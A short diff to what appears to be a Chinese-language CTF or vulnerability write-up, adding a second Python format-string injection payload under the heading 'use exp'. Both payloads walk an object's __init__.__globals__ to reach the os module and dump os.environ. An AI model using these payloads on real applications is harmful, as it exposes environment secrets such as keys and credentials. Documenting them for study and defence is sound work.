@@ -30,6 +30,7 @@
     使用exp：
 
     ```
+    {emojis.__init__.__globals__[app].__init__.__globals__[os].environ}
     {emojis.__init__.__globals__[app].wsgi_app.__globals__[os].environ}
     ```
     
